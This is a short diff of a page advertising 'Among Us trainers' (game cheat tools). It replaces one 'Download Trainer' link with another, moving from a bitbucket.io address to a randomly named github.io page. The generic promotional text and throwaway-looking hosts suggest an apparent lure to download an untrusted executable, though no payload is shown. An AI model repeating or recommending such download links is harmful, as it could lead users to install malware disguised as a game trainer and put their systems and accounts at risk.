@@ -4,7 +4,7 @@
 
 Among Us has captivated players worldwide with its blend of strategy and deception. For those looking to add a twist to their gameplay, trainers offer a range of enhancements. This guide explores popular Among Us trainers, their features, comparisons, system requirements, installation instructions, and more.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload5.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Among-Us-Trainer-wypum.github.io/.github)
 ---
 
 ## Product Description
